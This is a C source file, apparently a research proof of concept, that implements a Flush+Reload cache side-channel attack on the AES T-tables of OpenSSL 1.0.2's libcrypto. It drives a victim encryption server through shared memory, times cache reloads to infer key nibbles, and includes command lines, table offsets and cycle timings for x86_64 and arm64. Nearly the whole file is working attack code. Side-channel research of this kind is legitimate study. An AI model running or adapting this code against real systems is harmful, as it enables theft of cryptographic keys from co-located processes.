/**
 *	shared memory client (POSIX)
 *
 *	Copyright (C) 2016  Jinbum Park <jinb.park7@gmail.com> Haehyun Cho <hcho67@asu.edu>
*/

#include "common.h"
#include "table.h"
#include <stdbool.h>
#include <libflush.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/time.h>
#include <mqueue.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/un.h>

#define MAX_PLAINS 3000

#define ASYNC_DEFAULT 0
#define ASYNC_PRELOAD_END 1
#define ASYNC_FLUSH_END 2
#define ASYNC_ONE_ROUND_END 3
#define ASYNC_RELOAD_END 4
#define ASYNC_SMOKE_INIT 5

#define ASYNC_SHM_NAME "async_shm"
#define ASYNC_PERM_FILE (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)


U8 real_key[16] = {0x9e,0x41,0x00,0x5f,0xd9,0xa0,0xc2,0x28,0xe7,0xb4,0x31,0x29,0x94,0xaa,0x4d,0xc7};
U8 infer_key[16] = {0,};
U8 plains[MAX_PLAINS][16];
U8 enc[16] = {0x00,};
U32 plain_text_cnt = 0;

int crypto_fd;
void *crypto_addr;
U32 crypto_size;
unsigned int *te0 = NULL;
unsigned int off_te0;
const int cache_line_size = 64;
uint64_t threshold = 300;

int async_shm_fd = -1;
unsigned int *async_shm_addr = NULL;

/*
 * x86_64 :
 *		first_start_cycle - 9000
 *		start_cycle - 9000
 *		attack_cmd - ./attack 1000 250 001670c0 9000 9000 ../lib/openssl-1.0.2/libcrypto.so.1.0.0
 * arm64 :
 *		first_start_cycle - 9000
 *		start_cycle - 12000
 *		attack_cmd - ./attack 1000 300 00173dc0 9000 12000 /usr/lib/libcrypto.so.1.0.0
 */
U32 start_cycle = 5000;
U32 first_start_cycle = 5000;

pthread_t thread;
int thread_stop = 0;
int attack_flag = 0;
U32 thread_plain = 0;
U32 score[16][16] = {0,};

libflush_session_t *session;

U8 theory_arr[16] = {0,};
U32 arr_score[16] = {0,};

void bind_cpu(int id)
{
	int r;
	unsigned long mask = 0;

	if(id == 0) mask = 1;
	else if(id == 1) mask = 2;
	else if(id == 2) mask = 4;
	else if(id == 3) mask = 8;

	r = sched_setaffinity(0, sizeof(mask), &mask);
	if(r) {
		printf("sched_setaffinity error\n");
	}
}

void map_crypto(const char *path)
{
	struct stat st;

	crypto_fd = open(path, O_RDONLY);
	if(crypto_fd < 0) {
		printf("open error\n");
		exit(-1);
	}

	fstat(crypto_fd, &st);
	crypto_size = st.st_size;

	crypto_addr = mmap(NULL, crypto_size, PROT_READ, MAP_PRIVATE, crypto_fd, 0);
	if(crypto_addr == NULL) {
		printf("mmap error\n");
		exit(-1);
	}
	te0 = (U8 *)crypto_addr + off_te0;

	printf("[0] : %08x\n", *(te0));
	printf("[1] : %08x\n", *(te0 + 1));
	printf("[2] : %08x\n", *(te0 + 2));

	//munmap(crypto_addr, size);
	//close(crypto_fd);
}

void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
   unsigned int i, j;
   unsigned int mul;
   char data = 0;

   for(i=0, j=0; i<pInLen; i++) {
       if(i % 2 == 0)
           mul = 16;
       else
           mul = 1;

       if(pIn[i] >= '0' && pIn[i] <= '9')
           data += ((pIn[i] - 48) * mul);
       else if(pIn[i] >= 'a' && pIn[i] <= 'f')
           data += ((pIn[i] - 87) * mul);
       else if(pIn[i] >= 'A' && pIn[i] <= 'F')
           data += ((pIn[i] - 55) * mul);
       else
           return;

       if(mul == 1)
       {
           pOut[j] = data;
           data = 0;
           j++;
       }
   }
}


void read_plains(void)
{
	FILE *fp;
	char tmp[64] = {0,};
	U32 i, j, cnt;

	memset(plains, 0, sizeof(plains));

	fp = fopen("./plain.txt", "r");
	if(!fp) {
		printf("read plains error\n");
		exit(-1);
	}
 
	fscanf(fp, "%d\n", &cnt);
	if(MAX_PLAINS < plain_text_cnt)
		plain_text_cnt = MAX_PLAINS;

	i = 0;
	while(!feof(fp)) {
		fgets(tmp, sizeof(tmp), fp);
		string_to_hex(tmp, 32, plains[i]);
		memset(tmp, 0, sizeof(tmp));

		i++;
		if(i == plain_text_cnt)
			break;
	}

	fclose(fp);
}

static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

void get_args(int argc, char **argv)
{
	if(argc != 5) {
		printf("USAGE: ./attack <plain text cnt> <cache hit threshold> <offset te0> <crypto library path>\n");
		printf("EXAMPLE: ./attack 1000 200 001636c0 libcrypto.so.1.0.0\n");
		exit(-1);
	}

	plain_text_cnt = atoi(argv[1]);
	threshold = (uint64_t)atoi(argv[2]);
	hex_string_to_int(argv[3], strlen(argv[3]), &off_te0);
}

static inline void flush_te(U32 x)
{
	libflush_flush(session, te0 + (x * 16));
}

static inline int reload_te_is_useful(U32 x)
{
	uint64_t count;

	count = libflush_reload_address(session, te0 + (x * 16));

	if(count < threshold)
		return 1;
	return 0;
}

void *test_thread(void *arg)
{
	bind_cpu(2);
	libflush_reload_address(session, te0);
	return NULL;
}

void threshold_test(void)
{
	uint64_t count;
	U32 i;
	pthread_t th;
	int r;

	bind_cpu(3);
	for(i=0; i<10; i++) {
		libflush_flush(session, te0);
		count = libflush_reload_address(session, te0);
		printf("before : %d\n", (int)count);
		libflush_flush(session, te0);

		r = pthread_create(&th, NULL, test_thread, NULL);
		r = pthread_join(th, NULL);

		count = libflush_reload_address(session, te0);
		printf("after : %d\n", (int)count);
	}
}

void print_result_to_csv(void)
{
	FILE *fp = NULL;
	char str[128] = {0,};
	unsigned i;

	fp = fopen("./result.csv", "w");
	if (!fp) {
		printf("fopen error\n");
		return;
	}

	snprintf(str, 128, "test count,%d\n", plain_text_cnt);
	fwrite(str, 1, strlen(str), fp);
	
	fwrite("cache result\n", 1, strlen("cache result\n"), fp);
	for (i=0; i<16; i++) {
		if (i == 15)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
		fwrite(str, 1, strlen(str), fp);
	}
	
	for (i=0; i<16; i++) {
		if (i == 15)
			snprintf(str, 128, "%d\n", arr_score[i]);
		else
			snprintf(str, 128, "%d,", arr_score[i]);
		fwrite(str, 1, strlen(str), fp);
	}

	fwrite("\ntheoretical result\n", 1, strlen("\ntheoretical result\n"), fp);
	for (i=0; i<16; i++) {
		if (i == 15)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
		fwrite(str, 1, strlen(str), fp);
	}
	
	for (i=0; i<16; i++) {
		if (i == 15)
			snprintf(str, 128, "%d\n", theory_arr[i]);
		else
			snprintf(str, 128, "%d,", theory_arr[i]);
		fwrite(str, 1, strlen(str), fp);
	}

	fclose(fp);
}


struct shm_msg *client_msg;
struct shm_msg *server_msg;

void do_encrypt(U32 p)
{
	U32 j;

	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = 16;
	
	/* send msg */
	memcpy(client_msg->msg, plains[p], 16);
	client_msg->status = 1;

	/* read reply */
	while(1) {
		if(server_msg->status == 1) {
			memcpy(enc, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
	}
}

void *encrypt_thread(void *arg)
{
	bind_cpu(2);

	while(thread_stop == 0) {
		if(*(volatile int *)(&attack_flag) == 1) {
			do_encrypt(thread_plain);
			*(volatile int *)(&attack_flag) = 0;
		}
	}
	return NULL;
}

int flush_x = 0;
void *flush_thread(void *arg)
{
	int id;

	for(id=0; id<4; id++) {
		bind_cpu(id);
		flush_te(flush_x);
	}
	return NULL;
}

void run_and_exit_flush_thread(void)
{
	pthread_t th;
	int r;

	r = pthread_create(&th, NULL, flush_thread, NULL);
	if(r) {
		printf("pthread_create error\n");
		exit(-1);
	}

	r = pthread_join(th, NULL);
	if(r) {
		printf("pthread_join error\n");
		exit(-1);
	}
}

void init_thread(void)
{
	int r;

	r = pthread_create(&thread, NULL, encrypt_thread, NULL);
	if(r) {
		printf("pthread_create error\n");
		exit(-1);
	}
	thread_stop = 0;
}

void finalize_thread(void)
{
	int r;

	thread_stop = 1;
	r = pthread_join(thread, NULL);
	if(r) {
		printf("pthread_join error\n");
		exit(-1);
	}
}

static inline void arr_add_score(U8 *arr)
{
	U8 i;
	for(i=0; i<16; i++) {
		if(arr[i] == 1)
			arr_score[i] += 1;
	}
}

static inline void print_score(void)
{
	U8 i;
	printf("\nscore: ");
	for(i=0; i<16; i++) {
		printf("[%d-%d]", i, arr_score[i]);
	}
}

void print_theory_arr(int plain_idx)
{
	U8 val;
	U32 i;

	/* fill theory arr of one-round encryption */
	for(i=0; i<16; i+=4) {
		val = plains[plain_idx][i] ^ real_key[i];
		val = val >> 4;
		theory_arr[val] = 1;
	}

	/* print */
	printf("\ntheory-arr: ");
	for(i=0; i<16; i++) {
		if(theory_arr[i] == 1)
			printf("%d,", i);
	}
	printf("\n");
}

static int first_try = 3;
void do_attack(void)
{
	U32 p, i, c, id, t;
	U8 arr[16];
	U32 cnt;
	U32 sum;
	U32 sleep_cycle;
	U32 first_sleep_cycle;
	unsigned int status;

	U8 ideal[256];

	sum = 0;
	sleep_cycle = start_cycle;
	first_sleep_cycle = first_start_cycle;

	memset(score, 0, sizeof(score));
	bind_cpu(1);

	printf("[attack info]\n");
	printf("cache attack type :  Flush+Reload\n");
	printf("flush point :  After preload T-table\n");
	printf("reload point :  After first-round 4kb T-table access\n");
	printf("first waiting time :  %d cycles\n", first_sleep_cycle);
	printf("waiting time :  %d cycles\n", sleep_cycle);
	printf("test count : %d\n", plain_text_cnt);

	memset(arr_score, 0, sizeof(arr_score));
	p = 0;
	for(t=0; t<plain_text_cnt; t++) {
		do {
			memset(ideal, 0, 256);
			memset(arr, 0, 16);
			cnt = 0;
			thread_plain = p;

			for(i=0; i<16; i++) {
				/* 1. Ask encryption */
				*(volatile int *)(&attack_flag) = 1;

				while (1) {
					if (*((volatile unsigned int *)async_shm_addr) == ASYNC_SMOKE_INIT)
						break;
				}

				//printf("before flush\n");
			#ifndef _FLUSH_THREAD
				flush_te(i);
			#else
				flush_x = i;
				run_and_exit_flush_thread();
			#endif
				//printf("after flush\n");

				*((volatile unsigned int *)async_shm_addr) = ASYNC_FLUSH_END;
				while (1) {
					if (*((volatile unsigned int *)async_shm_addr) == ASYNC_ONE_ROUND_END)
						break;
				}

				//printf("before reload\n");
				if(reload_te_is_useful(i) == 1) {
					cnt++;
					arr[i] = 1;
				}
				//printf("after reload\n");

				*((volatile unsigned int *)async_shm_addr) = ASYNC_RELOAD_END;
				
			WAIT_ATTACK:
				while(*(volatile int *)(&attack_flag) == 1)
					__asm__ __volatile__ ("nop");
			}

			arr_add_score(arr);
			break;
		} while(1);

		sum += cnt;
	}

	print_score();
	print_theory_arr(thread_plain);
	printf("avg : %d\n", sum / plain_text_cnt);
}

void init_libflush(void)
{
	bool r;

	r = libflush_init(&session, NULL);
	if(r == false) {
		printf("libflush_init error\n");
		exit(-1);
	}
}

void finalize_libflush(void)
{
	libflush_terminate(session);
}

void create_async_shm(void)
{
	if((async_shm_fd = shm_open(ASYNC_SHM_NAME, O_CREAT | O_RDWR, ASYNC_PERM_FILE)) == -1) {
        printf("shm_open error\n");
        exit(-1);
    }

    if(ftruncate(async_shm_fd, 64) == -1) {
        printf("ftruncate error\n");
        exit(-1);
    }

    async_shm_addr = mmap(NULL, 64, PROT_READ | PROT_WRITE, MAP_SHARED, async_shm_fd, 0);
    if(async_shm_addr == MAP_FAILED) {
        printf("mmap error\n");
        exit(-1);
    }

	*async_shm_addr = ASYNC_DEFAULT;
    printf("[attacker] async status : %d\n", *async_shm_addr);
}

void delete_async_shm(void)
{
	if(munmap(async_shm_addr, 64) == -1) {
        printf("munmap error\n");
    }

    if(close(async_shm_fd) == -1) {
        printf("close error\n");
    }

    if(shm_unlink(ASYNC_SHM_NAME) == -1) {
        printf("shm_unlink error\n");
    }
}

int main(int argc, char **argv)
{
	char msg[MSG_SIZE_MAX];

	void *addr;
	int fd;
	ssize_t nread;

	int msg_size, repeat_count = 1;
	unsigned int i, j;

	/* init */
	get_args(argc, argv);
	read_plains();
	map_crypto(argv[4]);
	init_libflush();
	create_async_shm();
	//threshold_test();
	init_thread();

	/* get shm */
	if((fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
		printf("shm_open error : %s\n", strerror(errno));
		return -1;
	}

	/* mmap */
	addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if(addr == MAP_FAILED) {
		printf("mmap error : %s\n", strerror(errno));
		goto out;
	}

	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
	server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);

	/* send msg */
	do_attack();
	print_result_to_csv();

	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG);
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	client_msg->status = 1;

out:
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(fd) == -1) {
		printf("close error : %s\n", strerror(errno));
		return -1;
	}

	finalize_thread();
	finalize_libflush();
	munmap(crypto_addr, crypto_size);
	close(crypto_fd);
	delete_async_shm();
	return 0;
}
